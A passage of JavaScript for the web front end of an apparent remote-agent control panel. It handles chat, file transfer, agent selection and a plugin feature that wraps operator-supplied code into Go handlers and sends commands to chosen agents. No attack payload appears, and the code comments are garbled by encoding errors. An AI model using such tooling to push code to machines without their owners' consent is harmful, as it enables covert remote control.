            delBtn.innerText = "x";
            delBtn.style.cssText = "cursor:pointer;color:#888;margin-left:8px;";
            delBtn.title = "delete";
            let currentChatId = data.chatid;
            let currentMessage = data.message;
            delBtn.onclick = () => {
                this.deleteChat(currentChatId, currentMessage, div);
            };
            header.appendChild(delBtn);
        }
    
        div.appendChild(header);
        // 娑堟伅鍐呭
        if (data.type === "file") {
            let link = document.createElement("a");
            link.href = "javascript:void(0);";
            link.className = "file_link";
            link.innerText = "📎" + data.message;
    
            link.style.color = "#007BFF";
            link.style.textDecoration = "none";
            link.onclick = () => {
                this.downloadChatFile(data.message, link);
            };
            let linkDiv = document.createElement("div");
            linkDiv.style.marginTop = "4px";
            linkDiv.appendChild(link);
            div.appendChild(linkDiv);
        } else {
            let msgDiv = document.createElement("div");
            msgDiv.style.marginTop = "4px";
            msgDiv.innerText = data.message;
            div.appendChild(msgDiv);
        }
        // 鏃堕棿
        let timeSpan = document.createElement("span");
        timeSpan.className = "chat_time";
        timeSpan.innerText = data.time;
        div.appendChild(timeSpan);
        chat_div.appendChild(div);
        // 鑷姩婊氬埌搴曢儴
        chat_div.scrollTop = chat_div.scrollHeight;
    }
    async sendChat() {
        if (!chat_slice) {
            chat_slice = [];
        }
        let chat_input =
            document.getElementById("chat_input")
            .value
            .trim();
        if (chat_input === "") {
            return;
        }
        try {
            webSocketClient.send(
                "sendChat",
                {
                    username:Username,
                    message:chat_input,
                }
            );
        }catch(error){
            console.error(
                "Error in sendChat:",
                error
            );
        }
    }
    async deleteChat(chatid, message, chatDiv) {
        try {
            const responsePromise = webSocketClient.waitForMessage(
                (msg) =>
                    msg.path === "deleteChat" &&
                    String(msg.chatid) === String(chatid)
            );
            const sent = await webSocketClient.send("deleteChat", {
                chatid: String(chatid),
                username: Username,
                message: message
            });
            if (!sent) {
                customLog("Delete failed");
                return false;
            }
            const data = await responsePromise;
            if (data && data.code === 200 && String(data.chatid) === String(chatid)) {
                if (chatDiv) {
                    chatDiv.remove();
                }
                customLog("Chat deleted");
                return true;
            } else {
                customLog(data?.message || "Delete failed");
                return false;
            }
        } catch (error) {
            console.error("Error in deleteChat:", error);
            customLog("Delete failed");
            return false;
        }
    }
    async sendChatFile() {
        let fileInput = document.getElementById("chat_file");
        if(!fileInput.files.length){
            return;
        }
        let file = fileInput.files[0];
        let chatid = chat_slice.length > 0 ? chat_slice[chat_slice.length - 1].chatid + 1 : 1;
        let chat_div = document.getElementById("chat_div");
        let pendingDiv = document.createElement("div");
        pendingDiv.className = "chat_message me pending_file";
        pendingDiv.innerText =
            "📎 "
            + file.name
            + " ("
            + Math.round(file.size/1024)
            + " KB) - sending...";
        chat_div.appendChild(pendingDiv);
        chat_div.scrollTop =
            chat_div.scrollHeight;
        const toastId = createTransferToastId("upload-chat");
        try{
            await webSocketClient.sendFile(
                "chatFile",
                {
                    filename:file.name,
                    chatid:String(chatid),
                    username:Username
                },
                file,
                1024 * 1024,
                (offset, total)=>{
                    const progressPercent = total > 0
                        ? Math.min(100, Math.floor(offset / total * 100))
                        : 0;
                    customTransferToast(toastId, {
                        title: "Upload " + file.name,
                        percent: progressPercent,
                        state: "active",
                        detail: formatTransferBytes(offset) + " / " + formatTransferBytes(total),
                    });
                    let percent = total === 0
                        ? 100
                        : Math.min(
                            100,
                            Math.floor(offset / total * 100)
                        );
                    pendingDiv.innerText =
                        "📎"
                        + file.name
                        + " "
                        + percent
                        + "%";
                }
            );
            customTransferToast(toastId, {
                title: "Upload " + file.name,
                percent: 100,
                state: "done",
                detail: file.name,
                removeAfter: 1200,
            });
            pendingDiv.innerText =
                "📎"
                + file.name
                + " uploaded";
        }catch(e){
            console.error(
                "upload error:",
                e
            );
            pendingDiv.innerText =
                "❌"
                + file.name
                + " failed";
            pendingDiv.style.color="red";
            customTransferToast(toastId, {
                title: "Upload " + file.name,
                percent: 0,
                state: "error",
                detail: e.message || "upload failed",
                removeAfter: 2000,
            });
        }
        fileInput.value="";
    }
    async downloadChatFile(filename, linkEl = null){
        const originalText = linkEl ? linkEl.innerText : "";
        const toastId = createTransferToastId("download-chat");
        try {
            if (linkEl) {
                linkEl.style.pointerEvents = "none";
                linkEl.innerText = "Downloading 0%";
            }

            await webSocketClient.downloadFile(
                "downloadChatFile",
                { filename },
                65000,
                1024 * 1024,
                (received, total) => {
                    const percent = total > 0
                        ? Math.min(100, Math.floor(received / total * 100))
                        : 0;
                    customTransferToast(toastId, {
                        title: "Download " + filename,
                        percent,
                        state: "active",
                        detail: formatTransferBytes(received) + " / " + formatTransferBytes(total),
                    });
                    if (!linkEl) {
                        return;
                    }
                    linkEl.innerText = "Downloading " + percent + "%";
                }
            );

            customTransferToast(toastId, {
                title: "Download " + filename,
                percent: 100,
                state: "done",
                detail: filename,
                removeAfter: 1200,
            });

            if (linkEl) {
                linkEl.innerText = "Downloaded";
            }
        } catch(err){
            console.error(
                "download error:",
                err
            );
            if (linkEl) {
                linkEl.innerText = "Download failed";
            }
            customTransferToast(toastId, {
                title: "Download " + filename,
                percent: 0,
                state: "error",
                detail: err.message || "download failed",
                removeAfter: 2000,
            });
            customLog("Download failed");
        } finally {
            if (linkEl) {
                setTimeout(() => {
                    linkEl.style.pointerEvents = "";
                    linkEl.innerText = originalText || filename;
                }, 1200);
            }
        }
    }
}

function net_init() {
    try {
        const selectElement = document.getElementById('net_shell');
        if (!selectElement) {
            if (!window.netInitTimer) {
                window.netInitTimer = setInterval(function() {
                    if (net_init()) {
                        clearInterval(window.netInitTimer);
                        window.netInitTimer = null;
                    }
                }, 300);
            }
            return false;
        }
        if (!Array.isArray(User_data) || User_data.length === 0) {
            if (!window.netInitTimer) {
                window.netInitTimer = setInterval(function() {
                    if (net_init()) {
                        clearInterval(window.netInitTimer);
                        window.netInitTimer = null;
                    }
                }, 300);
            }
            return false;
        }
        const currentValue = selectElement.value;
        selectElement.innerHTML = '<option value="">Select</option>';
        User_data.forEach(item => {
            if (!item || !item.uid) {
                return;
            }
            const option = document.createElement('option');
            option.value = item.uid; // UID
            const hostText = item.host || item.hostname || item.username || "";
            option.textContent = hostText ? (hostText + " (" + item.uid + ")") : item.uid;
            selectElement.appendChild(option);
        });
        if (currentValue) {
            selectElement.value = currentValue;
        }
        if (selectElement.dataset.netChangeBound !== "true") {
            selectElement.dataset.netChangeBound = "true";
            selectElement.addEventListener("change", function() {
                const net = new lain_net();
                net.requestNetData(this.value);
            });
        }
        if (window.netInitTimer) {
            clearInterval(window.netInitTimer);
            window.netInitTimer = null;
        }
        return true;
    } catch (error) {
        console.error("error:", error);
        return false;
    }
}
function toggleInfo(uid,op) {
    console.log(uid,op)
    if(op == "info"){
        var infoContent = document.getElementById(uid+"-info-content");
    }else if(op == "choose"){
        var infoContent = document.getElementById(uid+"-choose-content");
    }
    infoContent.classList.toggle("show");
}
// 鍏抽棴 iframe
function closeIframe() {
    var iframePanel = document.getElementById('iframePanel');
    iframePanel.style.display = 'none';
}
// 鍒囨崲渚ц竟鏍�
function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    const button = document.querySelector('.toggle-button');
    const log = document.getElementById('log');
    const serverIndexDiv = document.querySelector(".server_index");
    const contentDiv = serverIndexDiv.querySelector(".content");
    sidebar.classList.toggle('shrink');
    if (sidebar.classList.contains('shrink')) {
        button.textContent = '>';
        log.style.left = '50px';
        log.style.width = 'calc(100% - 50px)';
        contentDiv.style.width = 'calc(100% - 50px)';
    } else {
        button.textContent = '<';
        log.style.left = '180px';
        log.style.width = 'calc(100% - 180px)';
        contentDiv.style.width = 'calc(100% - 180px)';
    }
}

// 绐楀彛璋冩暣澶у皬
document.addEventListener("DOMContentLoaded", function () {
    // **鍙皟鏁� .server_index > .content 鍜� #log 鐨勯珮搴�**
    const logDiv = document.getElementById("log");
    const logHandle = logDiv.querySelector(".resize-handle");
    const serverIndexDiv = document.querySelector(".server_index");
    const contentDiv = serverIndexDiv.querySelector(".content");
    let isResizingLog = false, startY, startContentHeight, startLogHeight, totalHeight;

    function startResize(e) {
        isResizingLog = true;
        startY = e.touches ? e.touches[0].clientY : e.clientY;
        startContentHeight = contentDiv.offsetHeight;
        startLogHeight = logDiv.offsetHeight;
        totalHeight = serverIndexDiv.offsetHeight;
        document.addEventListener("mousemove", resizeLog);
        document.addEventListener("mouseup", stopResize);
        document.addEventListener("touchmove", resizeLog);
        document.addEventListener("touchend", stopResize);
    }

    function resizeLog(e) {
        if (!isResizingLog) return;
        let currentY = e.touches ? e.touches[0].clientY : e.clientY;
        let deltaY = startY - currentY;
        let newContentHeight = Math.max(60, startContentHeight - deltaY);
        let minLogHeight = 20;
        let maxContentHeight = totalHeight - minLogHeight;
        if (newContentHeight > maxContentHeight) newContentHeight = maxContentHeight;
        contentDiv.style.height = newContentHeight + "px";
        logDiv.style.height = (totalHeight - newContentHeight) + "px";
    }

    function stopResize() {
        isResizingLog = false;
        document.removeEventListener("mousemove", resizeLog);
        document.removeEventListener("mouseup", stopResize);
        document.removeEventListener("touchmove", resizeLog);
        document.removeEventListener("touchend", stopResize);
    }

    // 鍒濆鍖栭珮搴﹁嚜閫傚簲
    function setInitialHeights() {
        const total = serverIndexDiv.offsetHeight;
        const contentH = Math.floor(total * 0.8);
        const logH = total - contentH;
        contentDiv.style.height = contentH + "px";
        logDiv.style.height = logH + "px";
    }
    setInitialHeights();
    window.addEventListener('resize', setInitialHeights);

    logHandle.addEventListener("mousedown", startResize);
    logHandle.addEventListener("touchstart", startResize);

    // **iframe 鎷栧姩**
    const iframePanel = document.getElementById("iframePanel");
    const dragHandle = iframePanel.querySelector(".drag-handle");
    let isDragging = false, offsetX, offsetY;

    function startDrag(e) {
        isDragging = true;
        offsetX = (e.touches ? e.touches[0].clientX : e.clientX) - iframePanel.offsetLeft;
        offsetY = (e.touches ? e.touches[0].clientY : e.clientY) - iframePanel.offsetTop;
        document.addEventListener("mousemove", dragMove);
        document.addEventListener("mouseup", stopDrag);
        document.addEventListener("touchmove", dragMove);
        document.addEventListener("touchend", stopDrag);
    }

    function dragMove(e) {
        if (!isDragging) return;
        let newX = (e.touches ? e.touches[0].clientX : e.clientX) - offsetX;
        let newY = (e.touches ? e.touches[0].clientY : e.clientY) - offsetY;
        const pageWidth = window.innerWidth, pageHeight = window.innerHeight;
        const panelWidth = iframePanel.offsetWidth, panelHeight = iframePanel.offsetHeight;
        if (newX < 0) newX = 0;
        else if (newX + panelWidth > pageWidth) newX = pageWidth - panelWidth;
        if (newY < 0) newY = 0;
        else if (newY + panelHeight > pageHeight) newY = pageHeight - panelHeight;
        iframePanel.style.left = newX + "px";
        iframePanel.style.top = newY + "px";
    }

    function stopDrag() {
        isDragging = false;
        document.removeEventListener("mousemove", dragMove);
        document.removeEventListener("mouseup", stopDrag);
        document.removeEventListener("touchmove", dragMove);
        document.removeEventListener("touchend", stopDrag);
    }

    dragHandle.addEventListener("mousedown", startDrag);
    dragHandle.addEventListener("touchstart", startDrag);

    // **渚ц竟鏍忓鑸�**
    const links = document.querySelectorAll(".sidebar a, .tle-sidebar a");
    const sections = document.querySelectorAll(".content > div");

    function showSection(targetId) {
        sections.forEach(section => {
            section.classList.toggle("hidden", section.id !== targetId);
        });
    }

    links.forEach(link => {
        link.addEventListener("click", function (e) {
            e.preventDefault();
            showSection(this.getAttribute("data-target"));
        });
        link.addEventListener("touchstart", function (e) {
            e.preventDefault();
            showSection(this.getAttribute("data-target"));
        });
    });

    // **榛樿閫変腑绗竴涓�**
    if (links.length > 0) {
        showSection(links[0].getAttribute("data-target"));
    }
});

document.addEventListener('DOMContentLoaded', function () {
    // 閫夋嫨鐢佃剳绔拰鎵嬫満绔殑渚ц竟鏍�
    const links = document.querySelectorAll('.sidebar a, .tle-sidebar a');
    const sections = document.querySelectorAll('.content > div');
    // 涓烘瘡涓摼鎺ユ坊鍔犵偣鍑讳簨浠�
    links.forEach(link => {
        link.addEventListener('click', function (e) {
            e.preventDefault();
            const targetId = this.getAttribute('data-target');
            sections.forEach(section => {
                if (section.id === targetId) {
                    section.classList.remove('hidden');
                } else {
                    section.classList.add('hidden');
                }
            });
        });
    });
    // 渚ц竟鏍忔樉绀�/闅愯棌鎸夐挳浜嬩欢
    document.getElementById("tel-toggleBtn").addEventListener("click", function() {
        const sidebar = document.getElementById("tle-sidebar");
        if (sidebar.style.display === "none" || sidebar.style.display === "") {
            sidebar.style.display = "block";
            this.textContent = "Close";
        } else {
            sidebar.style.display = "none";
            this.textContent = "Menu";
        }
    });
});
function showPluginDialog(uid, os, paramDescList, codeword) {
    // 瑙ｆ瀽鍙傛暟
    let paramDescArray = paramDescList ? decodeURIComponent(paramDescList).split(',') : [];
    const currentAgent = Array.isArray(User_data) ?
        User_data.find(function(agent) {
            return agent && agent.uid === uid;
        }) :
        null;
    const host = currentAgent ?
        (currentAgent.host || currentAgent.Host || "") :
        "";
    if (!uid || !os || !paramDescList || !codeword) {
        customAlert("Missing required parameters for plugin dialog.");
        return;
    }

    // 寮圭獥瀹瑰櫒
    const dialogId = "plugin-dialog-" + uid;
    let dialog = document.getElementById(dialogId);
    if (dialog) {
        dialog.style.display = "block";
        dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
        const firstInput = dialog.querySelector('input[type="text"]');
        if (firstInput) {
            firstInput.focus();
        }
        return;
    }
    if (!dialog) {
        dialog = document.createElement("form");
        dialog.id = dialogId;
        dialog.dataset.uid = uid;
        dialog.style.position = "fixed";
        dialog.style.top = "10%";
        dialog.style.left = "50%";
        dialog.style.transform = "translateX(-50%)";
        dialog.style.background = "#f9f9f9";
        dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
        dialog.style.maxWidth = "95vw";
        dialog.style.width = "95%";
        dialog.style.margin = "40px auto";
        dialog.style.border = "1px solid #ccc";
        dialog.style.borderRadius = "8px";
        dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
        dialog.style.padding = "48px 16px 16px";
        dialog.style.userSelect = "none";
        document.body.appendChild(dialog);
    }

    const dragBar = document.createElement("div");
    dragBar.style.position = "absolute";
    dragBar.style.top = "0";
    dragBar.style.left = "0";
    dragBar.style.width = "100%";
    dragBar.style.height = "36px";
    dragBar.style.cursor = "move";
    dragBar.style.background = "rgba(0,0,0,0.05)";
    dragBar.style.borderTopLeftRadius = "8px";
    dragBar.style.borderTopRightRadius = "8px";
    dragBar.style.touchAction = "none";
    dragBar.setAttribute("aria-label", "Drag plugin dialog");
    dialog.appendChild(dragBar);

    let closeBtn = document.createElement("button");
    closeBtn.type = "button";
    closeBtn.className = "dialog-close-btn";
    closeBtn.textContent = "x";
    closeBtn.setAttribute("aria-label", "close plugin dialog");
    closeBtn.onclick = function() {
        dialog.remove();
    };
    dialog.appendChild(closeBtn);
    let hostLabel = document.createElement("div");
    hostLabel.textContent = "Host: " + (host || "-");
    hostLabel.style.margin = "0 0 12px 0";
    hostLabel.style.fontSize = "12px";
    hostLabel.style.color = "#5f6f82";
    hostLabel.style.paddingRight = "48px";
    dialog.appendChild(hostLabel);

    // 鍙傛暟杈撳叆妗�
    paramDescArray.forEach(desc => {
        let input = document.createElement('input');
        input.type = 'text';
        input.placeholder = desc;
        input.style.display = "block";
        input.style.margin = "8px 0";
        input.style.width = "90%";
        input.style.padding = "8px";
        input.style.boxSizing = "border-box";
        dialog.appendChild(input);
    });

    // 鎻愪氦鎸夐挳
    let submitButton = document.createElement('button');
    submitButton.textContent = 'send';
    submitButton.style.padding = "10px 20px";
    submitButton.style.marginTop = "12px";
    submitButton.style.cursor = "pointer";
    submitButton.type = "button";
    submitButton.onclick = function(event) {
        event.preventDefault();
        sendMsg();
    };
    dialog.appendChild(submitButton);

    dialog.addEventListener("mousedown", function() {
        dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
    });

    let isDragging = false;
    let offsetX = 0;
    let offsetY = 0;

    function clamp(value, min, max) {
        return Math.max(min, Math.min(value, max));
    }

    function onMove(event) {
        if (!isDragging) {
            return;
        }
        if (event.cancelable) {
            event.preventDefault();
        }
        const point = event.touches ? event.touches[0] : event;
        const rect = dialog.getBoundingClientRect();
        const maxLeft = Math.max(0, window.innerWidth - rect.width);
        const maxTop = Math.max(0, window.innerHeight - rect.height);
        dialog.style.left = clamp(point.clientX - offsetX, 0, maxLeft) + "px";
        dialog.style.top = clamp(point.clientY - offsetY, 0, maxTop) + "px";
        dialog.style.transform = "";
    }

    function stopMove() {
        isDragging = false;
        document.body.style.userSelect = "";
        document.removeEventListener("mousemove", onMove);
        document.removeEventListener("mouseup", stopMove);
        document.removeEventListener("touchmove", onMove);
        document.removeEventListener("touchend", stopMove);
        document.removeEventListener("touchcancel", stopMove);
    }

    function startMove(event) {
        if (event.cancelable) {
            event.preventDefault();
        }
        const point = event.touches ? event.touches[0] : event;
        const rect = dialog.getBoundingClientRect();
        isDragging = true;
        offsetX = point.clientX - rect.left;
        offsetY = point.clientY - rect.top;
        dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
        document.body.style.userSelect = "none";
        document.addEventListener("mousemove", onMove);
        document.addEventListener("mouseup", stopMove);
        document.addEventListener("touchmove", onMove, {passive: false});
        document.addEventListener("touchend", stopMove);
        document.addEventListener("touchcancel", stopMove);
    }

    dragBar.addEventListener("mousedown", startMove);
    dragBar.addEventListener("touchstart", startMove, {passive: false});

    // 鍙戦€佹秷鎭嚱鏁�
    async function sendMsg() {
        let inputs = dialog.querySelectorAll('input[type="text"]');
        let msgParts = [];
        for (let input of inputs) {
            let value = input.value.trim();
            if (!value) {
                customAlert("Please fill in all fields.");
                return;
            }
            msgParts.push(value);
        }
        let msg = codeword + '*//*' + msgParts.join('*//*');
        try {
            const taskid = createRuntimeTaskId("plugin");
            let result = await webSocketClient.send(
                "msg",
                {
                    uid: uid,
                    msg: msg,
                    taskid: taskid
                }
            );
            if (!result) {
                customAlert("Message send failed");
                return;
            }
            customLog("Message sent successfully!");
            inputs.forEach(input => {
                input.value = '';
            });
        } catch(error) {
            console.error(
                "Failed to send message:",
                error
            );
            customLog(
                "Failed to send message: " + error.message
            );
        }
    }
}
async function submitPlugin(remark) {
    const dialog = document.getElementById("pluginDialog");
    if (!dialog) {
        customAlert("Plugin dialog not found");
        return false;
    }
    const finalRemark = (remark || dialog.dataset.remark || "").trim();
    const osSelect = dialog.querySelector("#select_os");
    const codeWordInput = dialog.querySelector("input[name='codeWord']");
    const codeInput = dialog.querySelector("input[name='code']");
    const parameterCountInput = dialog.querySelector("#parameterHidden");
    const parameterDescInput = dialog.querySelector("input[name='parameterDec']");

    const osName = osSelect ? osSelect.value.trim() : "";
    const codeWords = codeWordInput ? codeWordInput.value.trim() : "";
    const rawCode = codeInput ? codeInput.value.trim() : "";
    const parameterDesc = parameterDescInput ? parameterDescInput.value.trim() : "";
    const parameterCount = parameterCountInput ?
        Math.max(1, parseInt(parameterCountInput.value, 10) || 1) :
        1;
    const codeParts = Array.from(
        { length: parameterCount },
        function(_, index) {
            return "msg" + (index + 1);
        }
    );
    const parameter = codeParts.join(",");

    if (!finalRemark || !rawCode || !osName) {
        customAlert("remark, code and os are required");
        return false;
    }
    if (!codeWords) {
        customAlert("codeWord is required");
        return false;
    }
    if (!parameterDesc) {
        customAlert("parameter description is required");
        return false;
    }

    const submitBtn = dialog.querySelector("#submitBtn");
    if (submitBtn) {
        submitBtn.disabled = true;
    }
    try {
        const parameterDescArray = parameterDesc.split(",").map(function(part) {
            return part.trim();
        }).filter(function(part) {
            return part !== "";
        });
        while (parameterDescArray.length < parameterCount) {
            parameterDescArray.push("null");
        }
        const normalizedParameterDesc = parameterDescArray.join(",");
        const funcParams = codeParts.map(function(part) {
            return part + " string";
        }).join(", ");
        const callParams = codeParts.map(function(_, index) {
            return "msg[" + (index + 1) + "]";
        }).join(", ");
        let finalCodeBody = rawCode;
        for (let i = 1; i <= parameterCount; i++) {
            const regex = new RegExp("msg-" + i, "g");
            finalCodeBody = finalCodeBody.replace(regex, "msg" + i);
        }
        const finalCode = 'case "' + codeWords + '":\n    go func(' +
            funcParams +
            ') {' +
            finalCodeBody +
            '}(' +
            callParams +
            ')';
        const sent = await webSocketClient.send(
            "insertPlugin",
            {
                remark: finalRemark,
                code: finalCode,
                codeWords: codeWords,
                os: osName,
                parameter: parameter,
                parameterDesc: normalizedParameterDesc
            }
        );
        if (!sent) {
            customAlert("insertPlugin send failed");
            return false;
        }
        customLog("insertPlugin sent:", {
            remark: finalRemark,
            os: osName,
            codeWords: codeWords,
            parameter: parameter,
            parameterDesc: normalizedParameterDesc,
            code: finalCode
        });
        return true;
    } catch (err) {
        customAlert("insertPlugin failed: " + err.message);
        return false;
    } finally {
        if (submitBtn) {
            submitBtn.disabled = false;
        }
    }
}
function closePluginDialog() {
    var dialog = document.getElementById("pluginDialog");
    if (dialog) {
        dialog.style.transform = "translateX(-50%) scaleY(0)";
        dialog.style.opacity = "0";
        setTimeout(function () {
            if (dialog.parentNode) {
                dialog.parentNode.removeChild(dialog);
            }
        }, 300);
    }
}
window.submitPlugin = submitPlugin;
function formatCustomLogValue(value) {
    if (typeof value === "string") {
        return value;
    }
    if (value instanceof Error) {
        return value.stack || value.message;
    }
    if (typeof value === "undefined") {
        return "undefined";
    }
    if (value === null) {
        return "null";
    }
    try {
        return JSON.stringify(value, null, 2);
    } catch (err) {
        return String(value);
    }
}
function customLog() {
    let container = document.getElementById("custom-log-container");
    if (!container) {
        container = document.createElement("div");
        container.id = "custom-log-container";
        container.style.position = "fixed";
        container.style.right = "20px";
        container.style.top = "20px";
        container.style.width = "360px";
        container.style.maxWidth = "calc(100vw - 24px)";
        container.style.maxHeight = "50vh";
        container.style.overflowY = "auto";
        container.style.zIndex = "9998";
        container.style.display = "flex";
        container.style.flexDirection = "column";
        container.style.gap = "10px";
        document.body.appendChild(container);
    }

    const args = Array.from(arguments);
    const item = document.createElement("div");
    item.style.background = "rgba(255, 255, 255, 0.96)";
    item.style.color = "#2f2f2f";
    item.style.border = "1px solid rgba(120, 150, 180, 0.22)";
    item.style.borderRadius = "10px";
    item.style.padding = "12px 14px";
    item.style.boxShadow = "0 10px 28px rgba(80, 102, 125, 0.18)";
    item.style.fontFamily = "Consolas, Monaco, monospace";
    item.style.fontSize = "12px";
    item.style.lineHeight = "1.5";
    item.style.wordBreak = "break-word";
    item.style.opacity = "0";
    item.style.transform = "translateY(-10px)";
    item.style.transition = "opacity 0.6s ease, transform 0.6s ease";

    const header = document.createElement("div");
    header.style.display = "flex";
    header.style.justifyContent = "space-between";
    header.style.alignItems = "center";
    header.style.marginBottom = "6px";

    const timeLabel = document.createElement("span");
    timeLabel.textContent = new Date().toLocaleTimeString();
    timeLabel.style.color = "#4c84b8";
    timeLabel.style.fontSize = "11px";

    const closeButton = document.createElement("button");
    closeButton.type = "button";
    closeButton.textContent = "x";
    closeButton.style.border = "none";
    closeButton.style.background = "transparent";
    closeButton.style.color = "#7e8a96";
    closeButton.style.cursor = "pointer";
    closeButton.style.fontSize = "14px";
    closeButton.onclick = function() {
        if (item.parentNode) {
            item.parentNode.removeChild(item);
        }
    };

    header.appendChild(timeLabel);
    header.appendChild(closeButton);

    const content = document.createElement("pre");
    content.textContent = args.map(formatCustomLogValue).join(" ");
    content.style.margin = "0";
    content.style.whiteSpace = "pre-wrap";
    content.style.wordBreak = "break-word";

    item.appendChild(header);
    item.appendChild(content);
    container.appendChild(item);
    requestAnimationFrame(() => {
        item.style.opacity = "1";
        item.style.transform = "translateY(0)";
    });

    while (container.children.length > 12) {
        let removable = null;
        for (const child of Array.from(container.children)) {
            if (child.dataset && child.dataset.transferToast === "true") {
                continue;
            }
            removable = child;
            break;
        }
        if (!removable) {
            break;
        }
        container.removeChild(removable);
    }

    container.scrollTop = container.scrollHeight;

    let fadeTimer = null;
    let removeTimer = null;
    const startFadeOut = function() {
        item.style.opacity = "0";
        item.style.transform = "translateY(-6px)";
        removeTimer = setTimeout(() => {
            if (item.parentNode) {
                item.parentNode.removeChild(item);
            }
        }, 650);
    };
    const scheduleFadeOut = function() {
        clearTimeout(fadeTimer);
        clearTimeout(removeTimer);
        fadeTimer = setTimeout(startFadeOut, 4500);
    };
    item.onmouseenter = function() {
        clearTimeout(fadeTimer);
        clearTimeout(removeTimer);
        item.style.opacity = "1";
        item.style.transform = "translateY(0)";
    };
    item.onmouseleave = function() {
        scheduleFadeOut();
    };
    scheduleFadeOut();
}
// 鏇夸唬alert鍑芥暟锛屼娇鐢ㄨ嚜瀹氫箟寮圭獥
function formatTransferBytes(bytes) {
    const size = Number(bytes);
    if (!isFinite(size) || size < 0) {
        return "0 B";
    }
    if (size < 1024) {
        return Math.floor(size) + " B";
    }
    const units = ["KB", "MB", "GB", "TB"];
    let value = size / 1024;
    let unitIndex = 0;
    while (value >= 1024 && unitIndex < units.length - 1) {
        value /= 1024;
        unitIndex += 1;
    }
    return value.toFixed(value >= 10 ? 0 : 1) + " " + units[unitIndex];
}

function createTransferToastId(prefix = "transfer") {
    return prefix + "-" + Date.now() + "-" + Math.random().toString(36).slice(2, 8);
}

function ensureTransferToastContainer() {
    let container = document.getElementById("transfer-toast-container");
    if (!container) {
        container = document.createElement("div");
        container.id = "transfer-toast-container";
        container.style.position = "fixed";
        container.style.right = "20px";
        container.style.top = "20px";
        container.style.width = "360px";
        container.style.maxWidth = "calc(100vw - 24px)";
        container.style.maxHeight = "50vh";
        container.style.overflowY = "auto";
        container.style.zIndex = "9998";
        container.style.display = "flex";
        container.style.flexDirection = "column";
        container.style.gap = "10px";
        container.style.pointerEvents = "none";
        document.body.appendChild(container);
    }
    return container;
}

function removeTransferToast(id) {
    const state = window.__transferToastState;
    if (!state || !state.items || !state.items.has(id)) {
        return;
    }
    const record = state.items.get(id);
    if (record.timer) {
        clearTimeout(record.timer);
    }
    if (record.item) {
        record.item.style.opacity = "0";
        record.item.style.transform = "translateY(-6px)";
        setTimeout(() => {
            if (record.item && record.item.parentNode) {
                record.item.parentNode.removeChild(record.item);
            }
        }, 220);
    }
    state.items.delete(id);
}

function customTransferToast(id, options = {}) {
    const container = ensureTransferToastContainer();
    if (!window.__transferToastState) {
        window.__transferToastState = {
            items: new Map(),
        };
    }
    const state = window.__transferToastState;
    let record = state.items.get(id);
    if (!record) {
        const item = document.createElement("div");
        item.dataset.transferToast = "true";
        item.style.pointerEvents = "auto";
        item.style.background = "rgba(255, 255, 255, 0.97)";
        item.style.color = "#2f2f2f";
        item.style.border = "1px solid rgba(120, 150, 180, 0.22)";
        item.style.borderRadius = "10px";
        item.style.padding = "12px 14px";
        item.style.boxShadow = "0 10px 28px rgba(80, 102, 125, 0.18)";
        item.style.fontFamily = "Consolas, Monaco, monospace";
        item.style.fontSize = "12px";
        item.style.lineHeight = "1.5";
        item.style.wordBreak = "break-word";
        item.style.opacity = "0";
        item.style.transform = "translateY(-10px)";
        item.style.transition = "opacity 0.35s ease, transform 0.35s ease";

        const header = document.createElement("div");
        header.style.display = "flex";
        header.style.justifyContent = "space-between";
        header.style.alignItems = "center";
        header.style.gap = "12px";
        header.style.marginBottom = "8px";

        const title = document.createElement("div");
        title.style.fontWeight = "700";
        title.style.color = "#27455f";
        title.style.flex = "1";
        title.style.minWidth = "0";
        title.style.overflow = "hidden";
        title.style.textOverflow = "ellipsis";
        title.style.whiteSpace = "nowrap";

        const status = document.createElement("span");
        status.style.fontSize = "11px";
        status.style.color = "#4c84b8";
        status.style.whiteSpace = "nowrap";

        const closeButton = document.createElement("button");
        closeButton.type = "button";
        closeButton.textContent = "x";
        closeButton.style.border = "none";
        closeButton.style.background = "transparent";
        closeButton.style.color = "#7e8a96";
        closeButton.style.cursor = "pointer";
        closeButton.style.fontSize = "14px";
        closeButton.onclick = function() {
            removeTransferToast(id);
        };

        header.appendChild(title);
        header.appendChild(status);
        header.appendChild(closeButton);

        const barWrap = document.createElement("div");
        barWrap.style.height = "8px";
        barWrap.style.borderRadius = "999px";
        barWrap.style.background = "rgba(76, 132, 184, 0.12)";
        barWrap.style.overflow = "hidden";

        const barFill = document.createElement("div");
        barFill.style.height = "100%";
        barFill.style.width = "0%";
        barFill.style.borderRadius = "999px";
        barFill.style.background = "linear-gradient(90deg, #4c84b8, #69c2ff)";
        barFill.style.transition = "width 0.25s ease, background 0.25s ease";
        barWrap.appendChild(barFill);

        const detail = document.createElement("div");
        detail.style.marginTop = "8px";
        detail.style.fontSize = "11px";
        detail.style.color = "#5d6f7f";
        detail.style.whiteSpace = "pre-wrap";
        detail.style.wordBreak = "break-word";

        item.appendChild(header);
        item.appendChild(barWrap);
        item.appendChild(detail);
        container.appendChild(item);

        requestAnimationFrame(() => {
            item.style.opacity = "1";
            item.style.transform = "translateY(0)";
        });

        record = {
            item,
            title,
            status,
            barFill,
            detail,
            timer: null,
        };
        state.items.set(id, record);
    }

    if (record.timer) {
        clearTimeout(record.timer);
        record.timer = null;
    }

    const titleText = options.title || record.title.textContent || "";
    const percent = typeof options.percent === "number" ? Math.max(0, Math.min(100, Math.floor(options.percent))) : null;
    const stateName = options.state || "active";
    const detailText = options.detail || "";

    record.title.textContent = titleText;
    record.detail.textContent = detailText;

    if (percent === null) {
        record.barFill.style.width = "0%";
        record.status.textContent = stateName === "done" ? "Done" : stateName === "error" ? "Failed" : "";
    } else {
        record.barFill.style.width = percent + "%";
        record.status.textContent = stateName === "done" ? "Done" : stateName === "error" ? "Failed" : (percent + "%");
    }

    record.barFill.style.background = stateName === "error" ?
        "linear-gradient(90deg, #d65b5b, #ff8b8b)" :
        stateName === "done" ?
            "linear-gradient(90deg, #55b37a, #8ee4b1)" :
            "linear-gradient(90deg, #4c84b8, #69c2ff)";

